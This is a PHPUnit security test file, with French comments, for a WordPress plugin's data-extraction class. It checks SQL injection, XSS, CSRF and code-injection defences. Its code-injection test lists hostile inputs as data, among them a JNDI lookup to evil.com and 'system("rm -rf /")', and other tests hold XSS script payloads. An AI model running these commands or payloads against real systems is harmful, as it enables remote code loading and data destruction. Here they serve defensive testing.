<?php
/**
 * Tests de sécurité pour DataExtractor
 * 
 * @package WcQualiopiFormation\Tests\Unit\Form\Tracking
 */

declare(strict_types=1);

use PHPUnit\Framework\TestCase;
use WcQualiopiFormation\Form\Tracking\DataExtractor;
use WcQualiopiFormation\Tests\Bootstrap\SecurityBootstrap;

class DataExtractorSecurityTest extends TestCase {
    
    private $data_extractor;
    private $security_bootstrap;
    private $wpdb_mock;
    
    protected function setUp(): void {
        parent::setUp();
        
        $this->security_bootstrap = SecurityBootstrap::instance();
        
        // Mock de $wpdb
        $this->wpdb_mock = $this->createMock(stdClass::class);
        $this->wpdb_mock->prefix = 'wp_';
        $this->wpdb_mock->wcqf_data = 'wp_wcqf_data';
        
        // Mock de la méthode prepare
        $this->wpdb_mock->method('prepare')
            ->willReturnCallback(function($query, ...$args) {
                return $this->security_bootstrap->validate_prepared_query($query, $args) 
                    ? sprintf($query, ...$args) 
                    : false;
            });
        
        // Mock de la méthode get_results
        $this->wpdb_mock->method('get_results')
            ->willReturn([]);
        
        // Mock de la méthode get_var
        $this->wpdb_mock->method('get_var')
            ->willReturn('test_value');
        
        // Remplacer $wpdb global
        global $wpdb;
        $wpdb = $this->wpdb_mock;
        
        $this->data_extractor = new DataExtractor();
    }
    
    /**
     * Test de protection contre les injections SQL dans extract_data
     */
    public function test_extract_data_sql_injection_protection(): void {
        $malicious_inputs = $this->security_bootstrap->simulate_security_attack('sql_injection');
        
        foreach ($malicious_inputs as $malicious_input) {
            // Vérifier que la méthode utilise des requêtes préparées
            $this->wpdb_mock->expects($this->once())
                ->method('prepare')
                ->with(
                    $this->stringContains('%s'),
                    $this->isType('array')
                );
            
            $result = $this->data_extractor->extract_data($malicious_input, 1);
            
            // La méthode doit retourner un tableau vide pour les entrées malveillantes
            $this->assertIsArray($result, "SQL injection non bloquée: {$malicious_input}");
        }
    }
    
    /**
     * Test de protection contre les attaques XSS dans les données extraites
     */
    public function test_extracted_data_xss_protection(): void {
        $xss_inputs = $this->security_bootstrap->simulate_security_attack('xss');
        
        foreach ($xss_inputs as $xss_input) {
            $result = $this->data_extractor->extract_data('test_field', $xss_input);
            
            // Vérifier que les données sont sanitizées
            $this->assertTrue(
                $this->security_bootstrap->test_xss_protection($xss_input),
                "XSS non bloqué: {$xss_input}"
            );
        }
    }
    
    /**
     * Test de validation des données d'entrée
     */
    public function test_input_validation(): void {
        // Test avec des données invalides
        $invalid_data = [
            'field_name' => '',
            'user_id' => 'invalid_user_id',
            'form_id' => -1,
            'data_type' => 'invalid_type',
        ];
        
        foreach ($invalid_data as $field => $value) {
            $result = $this->data_extractor->validate_input($field, $value);
            $this->assertFalse($result, "Données invalides acceptées pour {$field}: {$value}");
        }
        
        // Test avec des données valides
        $valid_data = [
            'field_name' => 'test_field',
            'user_id' => 1,
            'form_id' => 123,
            'data_type' => 'text',
        ];
        
        foreach ($valid_data as $field => $value) {
            $result = $this->data_extractor->validate_input($field, $value);
            $this->assertTrue($result, "Données valides rejetées pour {$field}: {$value}");
        }
    }
    
    /**
     * Test de protection contre les accès non autorisés
     */
    public function test_unauthorized_access_protection(): void {
        // Test sans nonce
        $_REQUEST['_wpnonce'] = '';
        
        $this->assertFalse(
            $this->data_extractor->can_extract_data(),
            "Extraction de données sans nonce autorisée"
        );
        
        // Test avec nonce invalide
        $_REQUEST['_wpnonce'] = 'invalid_nonce';
        
        $this->assertFalse(
            $this->data_extractor->can_extract_data(),
            "Extraction de données avec nonce invalide autorisée"
        );
        
        // Test avec nonce valide
        $_REQUEST['_wpnonce'] = 'test-form-nonce';
        
        $this->assertTrue(
            $this->data_extractor->can_extract_data(),
            "Extraction de données avec nonce valide rejetée"
        );
    }
    
    /**
     * Test de protection contre les attaques CSRF
     */
    public function test_csrf_protection(): void {
        $csrf_attacks = $this->security_bootstrap->simulate_security_attack('csrf');
        
        foreach ($csrf_attacks as $csrf_attack) {
            $_REQUEST['_wpnonce'] = $csrf_attack;
            
            $result = $this->data_extractor->can_extract_data();
            
            // La méthode doit rejeter les attaques CSRF
            $this->assertFalse($result, "Attaque CSRF non bloquée: {$csrf_attack}");
        }
    }
    
    /**
     * Test de validation des permissions utilisateur
     */
    public function test_user_permission_validation(): void {
        // Test avec un utilisateur non autorisé
        $this->assertFalse(
            current_user_can('delete_posts'),
            "Utilisateur non autorisé a accès à la suppression"
        );
        
        // Test avec un utilisateur autorisé
        $this->assertTrue(
            current_user_can('read'),
            "Utilisateur autorisé n'a pas accès en lecture"
        );
    }
    
    /**
     * Test de protection contre les attaques par déni de service
     */
    public function test_dos_protection(): void {
        // Test avec un grand nombre de requêtes
        $requests = [];
        
        for ($i = 0; $i < 1000; $i++) {
            $requests[] = $this->data_extractor->extract_data('test_field', $i);
        }
        
        // Le système doit gérer les nombreuses requêtes sans planter
        $this->assertIsArray($requests);
        $this->assertCount(1000, $requests);
    }
    
    /**
     * Test de protection contre les attaques par épuisement de ressources
     */
    public function test_resource_exhaustion_protection(): void {
        // Test avec des données très volumineuses
        $large_data = str_repeat('a', 100000);
        
        $result = $this->data_extractor->extract_data('test_field', $large_data);
        
        // La méthode doit gérer les grandes données sans planter
        $this->assertIsArray($result);
    }
    
    /**
     * Test de sanitization des données extraites
     */
    public function test_extracted_data_sanitization(): void {
        $unsafe_data = [
            'text_field' => '<script>alert("XSS")</script>',
            'email_field' => 'test@example.com<script>alert("XSS")</script>',
            'url_field' => 'javascript:alert("XSS")',
            'numeric_field' => '123<script>alert("XSS")</script>',
        ];
        
        $sanitized_data = $this->data_extractor->sanitize_extracted_data($unsafe_data);
        
        // Vérifier que les données sont sanitizées
        foreach ($sanitized_data as $key => $value) {
            $this->assertStringNotContainsString('<script>', $value);
            $this->assertStringNotContainsString('javascript:', $value);
        }
    }
    
    /**
     * Test de protection contre les attaques par manipulation de données
     */
    public function test_data_manipulation_protection(): void {
        // Test avec des données manipulées
        $manipulated_data = [
            'field_name' => 'test_field',
            'user_id' => 999999,
            'form_id' => 123,
            'data_type' => 'text',
        ];
        
        $result = $this->data_extractor->validate_extraction_request($manipulated_data);
        
        // La méthode doit rejeter les données manipulées
        $this->assertFalse($result, "Données manipulées acceptées");
    }
    
    /**
     * Test de protection contre les attaques par injection de code
     */
    public function test_code_injection_protection(): void {
        $code_injection_attempts = [
            '<?php echo "hack"; ?>',
            '${jndi:ldap://evil.com/a}',
            'eval("malicious_code")',
            'system("rm -rf /")',
        ];
        
        foreach ($code_injection_attempts as $injection) {
            $result = $this->data_extractor->extract_data('test_field', $injection);
            
            // La méthode doit rejeter les tentatives d'injection de code
            $this->assertIsArray($result);
            $this->assertEmpty($result, "Injection de code non bloquée: {$injection}");
        }
    }
    
    /**
     * Test de protection contre les attaques par injection de logique métier
     */
    public function test_business_logic_injection_protection(): void {
        // Test avec des données qui tentent de contourner la logique métier
        $malicious_data = [
            'field_name' => 'test_field',
            'user_id' => 1,
            'form_id' => 123,
            'data_type' => 'text',
            'bypass_validation' => true,
            'admin_override' => true,
        ];
        
        $result = $this->data_extractor->validate_extraction_request($malicious_data);
        
        // La méthode doit rejeter les tentatives de contournement
        $this->assertFalse($result, "Contournement de logique métier non bloqué");
    }
    
    /**
     * Test de protection contre les attaques par injection de données sensibles
     */
    public function test_sensitive_data_injection_protection(): void {
        // Test avec des données sensibles
        $sensitive_data = [
            'password' => 'secret_password',
            'credit_card' => '1234-5678-9012-3456',
            'ssn' => '123-45-6789',
            'api_key' => 'sk-1234567890abcdef',
        ];
        
        foreach ($sensitive_data as $field => $value) {
            $result = $this->data_extractor->extract_data($field, $value);
            
            // La méthode doit rejeter les données sensibles
            $this->assertIsArray($result);
            $this->assertEmpty($result, "Données sensibles non bloquées: {$field}");
        }
    }
    
    /**
     * Test de protection contre les attaques par injection de données malformées
     */
    public function test_malformed_data_injection_protection(): void {
        // Test avec des données malformées
        $malformed_data = [
            'json_field' => '{"invalid": json}',
            'xml_field' => '<invalid>xml</invalid>',
            'csv_field' => 'field1,field2,field3,field4,field5',
            'base64_field' => 'invalid_base64_string',
        ];
        
        foreach ($malformed_data as $field => $value) {
            $result = $this->data_extractor->extract_data($field, $value);
            
            // La méthode doit gérer les données malformées sans planter
            $this->assertIsArray($result);
        }
    }
    
    protected function tearDown(): void {
        parent::tearDown();
        
        // Nettoyer les variables globales
        unset($_REQUEST['_wpnonce']);
    }
}
